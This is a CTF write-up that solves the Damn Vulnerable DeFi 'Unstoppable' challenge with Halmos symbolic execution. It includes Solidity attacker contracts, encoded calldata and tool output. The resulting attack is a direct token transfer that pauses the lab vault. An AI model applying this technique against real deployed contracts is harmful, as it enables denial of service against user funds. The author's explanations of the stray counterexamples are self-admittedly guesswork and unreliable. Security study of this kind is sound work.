# Halmos vs Unstoppable 
## Idea overview
Let's imagine that we don't know how to solve this challenge. The only things we know are the code of contracts, pre-written "setUp()" function, final state we must achieve and the "test_unstoppable()" function, where we should write our solution.
The idea is:
1. Create some "AbstractAttacker" contract, controlled by player and give it all necessary resources  (DamnValuableToken supply).
2. AbstractAttacker should be able to symbolically execute all known contracts with all possible parameters to find necessary state.
3. In "_isSolved()" function write assert, opposite to existing one. That means, there is 
```
assertTrue(vault.paused(), "Vault is not paused");
```
assert, that expects to vault be paused. We'll change it to
```
assertFalse(vault.paused(), "Vault is not paused");
```
so Halmos will find counterexample where vault is not paused. This will be our solution for the challenge.

4. Paste this counterexample to initial code and execute forge test 
5. Forge test should be passed
## Common prerequisites
1. Copy Unstoppable.t.sol file to Unstoppable_Halmos.t.sol. All Halmos-related changes should be done here.
2. Since Halmos doesn't support 
```
vm.expectEmit()
```
cheatcode, we simply delete this code.

3. Rename "test_unstoppable()" to "check_unstoppable()", so Halmos will execute this function symbolically.
4. Since Halmos doesn't support the next cheatcode, it should be replaced:
```
vm.startPrank(player, player);
```
by
```
vm.startPrank(player);
```

5. Halmos execution should be done without timeout assertion:
```
halmos --solver-timeout-assertion 0
```


## Deploying AbstractAttacker contract
So, let's write our "check_unstoppable()" function:
```javascript
function  check_unstoppable() public  checkSolvedByPlayer {

AbstractAttacker attacker =  new  AbstractAttacker(); // Deploy attacker contract
token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
attacker.attack(); // execute symbolic attack
}
```
Pretty simple so far.
## AbstractAttacker implementation
First of all, it should support symbolic execution and common forge cheatcodes so let's import the necessary stuff:
```javascript
// SPDX-License-Identifier: MIT
pragma  solidity =0.8.25;
import  "../../lib/halmos-cheatcodes/src/SymTest.sol";
import  "forge-std/Test.sol";
```
Let's implement our first "naive" contract implementation:
```javascript
contract  AbstractAttacker  is  Test, SymTest {
	function  attack() public {
		address to_call = svm.createAddress('to_call'); // Generate symbolic address
		bytes  memory data = svm.createBytes(100, 'data'); // Generate symbolic data
		(bool success, ) = to_call.call(data); // execute symbolic function for symbolic 	address
		if (!success) {
			revert(); // attack function is guaranted to success
		}
	}
}
```
and try to execute it:
```bash
~halmos --solver-timeout-assertion 0
...
[ERROR] check_unstoppable() (paths: 3, time: 0.39s, bounds: [])
WARNING:halmos:Encountered Unknown contract call: to = halmos_to_call_address_01(); calldata = halmos_data_bytes_02(); callvalue = 0x0000000000000000000000000000000000000000000000000000000000000000
(see https://github.com/a16z/halmos/wiki/warnings#internal-error)
Symbolic test result: 0 passed; 1 failed; time: 0.93s
```
Oops, we got an "Encountered Unknown contract call" error. Therefore, we can't use symbolic address as a call address. The solution is to have some list of "known" contracts and brootforce symbolic calls to them:
```javascript
contract  AbstractAttacker  is  Test, SymTest {

	mapping (uint256  =>  address) known_addresses;
	uint256 known_next_index =  0;

	function  add_known_address(address  known) public {
		known_addresses[known_next_index] = known;
		known_next_index++;
	}
	function  attack() public {
		uint256 contract_index = svm.createUint256('contract_index');
		vm.assume(contract_index < known_next_index);
		for (uint256 i =  0; i < known_next_index; i++) { // brootforce is happening here
			if (i == contract_index) {
				address to_call = known_addresses[i]; // contract address is not symbolic now
				bytes  memory data = svm.createBytes(100, 'data');
				(bool success, ) = to_call.call(data);
				if (!success) {
					revert(); // attack function is guaranted to success
				}
			}
		}
	}
}
```
and add some known addresses:
```javascript
function  check_unstoppable() public  checkSolvedByPlayer {

AbstractAttacker attacker =  new  AbstractAttacker(); // Deploy attacker contract
token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
attacker.add_known_address(address(token));
attacker.add_known_address(address(vault));
attacker.add_known_address(address(monitorContract));
attacker.attack(); // execute symbolic attack
}
```
Now, Halmos can symbolically execute calls to different contracts:
```bash
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000400000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
...
```
We'll ignore them for now.
## _isSolved() implementation and counterexample
This function is check function, that is executing just after "check_unstoppable()". Attacker finished it's work, so it's time to check state and generate counterexample:
```javascript
function  _isSolved() private {
	vm.prank(deployer);
	monitorContract.checkFlashLoan(100e18);
	// Halmos should generate counterexample here.
	// We expect it to find such a contract and data that sets the vault paused.
	assertTrue(vault.paused(), "Vault is not paused"); 
}
```
Execute it:
```javascript
halmos --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x95d89b41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003fffffffffffffffffffefffffeffffffffe8d7e77ffcc7a964067301b6749db00000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x7ecebe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x3644e515000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x70a08231000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x313ce567000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x18160ddd000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x06fdde03000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xefbe1c1c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x23b872dd000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0x095ea7b3000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xdd62ed3e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xd9d98ce400000000000000000000000000000000000000000000000000000000aaaa0002000000000000000000000000000000000000000000007fff759c0d04380000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xd905777e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xc63d75b6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xc1a287e2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xef8b30f7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xc6e6f592000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xb460af94000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xba08765200000000000000000000000000000000000000000000d3c21bcecceda1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000aaaa0005 (100 bytes)
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000001 (1)
    halmos_data_bytes_02 = 0xce96cb77000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
    ....
```
A lot of TRASH counterexamples, that obviously just random calls to random contracts. These calls do not lead to vault pause. Actually, I don't know where did they come from :).
But, fortunately, I accidentally found the solution for this problem! I added some random public variable read in the start of "_isSolved()":
```javascript
function  _isSolved() private {
	vm.prank(deployer);
	address feeRecipientGot = vault.feeRecipient(); // Public variable reading
	monitorContract.checkFlashLoan(100e18);
	assertFalse(vault.paused(), "Vault is not paused"); // Counterexample here
}
```
Execute again:
```bash
halmos --solver-timeout-assertion 0
...
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
...
```
SPOILER: this is exactly what we are searching for!

Let's break down this output:
```bash
halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
```
means that this is the 0th contract from known contracts list (DamnValuableToken contract)
```bash
halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
```
is more interesting. First 4 bytes "a9059cbb" are token "transfer" selector
Next 20 bytes 
```bash
00000000000000000000000000000000000000000000000000000000aaaa0003
```
is some address. This is tokens receiver address. We'll find out what address is it later.
And the third part 
```bash
00000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000
```
is amount of tokens to transfer. 0s in the end is padding. Since we generated 100 symbolic bytes, it generates 0s padding. We can leave it as is.
Now, it is necessary to find out what the address is our "receiver". We'll use console logging functional from forge and print all contracts addresses in "setUp()" function:
```javascript
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma  solidity =0.8.25;
import {Test, console} from  "forge-std/Test.sol";
import {DamnValuableToken} from  "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from  "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from  "../../src/unstoppable/UnstoppableMonitor.sol";
import  "./AbstractAttacker.sol";
import  "forge-std/console.sol";
...
function  setUp() public {
...
	console.logAddress(address(token));
	console.logAddress(address(vault));
	console.logAddress(address(monitorContract));

	vm.stopPrank();
}
```
Execute:
```bash
halmos --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] 0x00000000000000000000000000000000000000000000000000000000aaaa0004
Counterexample: 
    halmos_contract_index_uint256_01 = 0x0000000000000000000000000000000000000000000000000000000000000000 (0)
    halmos_data_bytes_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa000300000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000 (100 bytes)
```
So, it was "vault" contract. Attacker sends some tokens to vault contract and it should lead to contract pause.
## Using of counterexample 
First of all, let's find "vault" contract address in forge. We'll use the same console logging here and this is what we got:
```bash
forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Logs:
  0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
  0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264 // This is vault address in forge
  0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
  ...
```
Implement non-abstract attacker contract:
```javascript
// SPDX-License-Identifier: MIT
pragma  solidity =0.8.25;
import  "../../lib/halmos-cheatcodes/src/SymTest.sol";
import  "forge-std/Test.sol";
contract  AbstractAttacker  is  Test, SymTest {
	mapping (uint256  =>  address) known_addresses;
	uint256 known_next_index =  0;
	
	function  add_known_address(address  known) public {
		known_addresses[known_next_index] = known;
		known_next_index++;
	}
	function  attack() public {
		uint256 contract_index =  0x0000000000000000000000000000000000000000000000000000000000000000; // Contract index is not symbolic, just paste value from counterexample
		for (uint256 i =  0; i < known_next_index; i++) {
			if (i == contract_index) {
				address to_call = known_addresses[i];
				// Paste hex from counterxample here, but replace receiver address with the correct one
				bytes  memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000";
				(bool success, ) = to_call.call(data);
				if (!success) {
					revert();
				}
			}
		}
	}
}
```
This is an exact copy of AbstractAttacker, except we've replaced the symbolic values ​​with concrete values ​​from the counterexample.
And test_unstoppable():
```javascript
/**
* CODE YOUR SOLUTION HERE
*/
function  test_unstoppable() public  checkSolvedByPlayer {
	Attacker attacker =  new  Attacker();
	token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
	attacker.add_known_address(address(token));
	attacker.add_known_address(address(vault));
	attacker.add_known_address(address(monitorContract));
	attacker.attack();
}
```
Let's execute:
```bash
forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57390)
[PASS] test_unstoppable() (gas: 332461)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.62ms (331.63µs CPU time)

Ran 1 test suite in 7.44ms (2.62ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
Success! The challenge "Unstoppable" is solved successfully using Halmos symbolic testing.
## Conclusions
1. Yes, we have proved that Halmos is ABLE to find solution for such CTF challenges
2.  I don't know where that number of false-negative counterexamples came from. This is a big problem and this question should be answered in future
3. I don't know why some random read of public variable from "vault" contract fixed counterexamples. It looks like a bug and this question should be answered as well
4. Counterexamples analysis may be tricky because of hard-coded addresses and parameters. We can't just put counterexample in initial code and expect it will behave as expected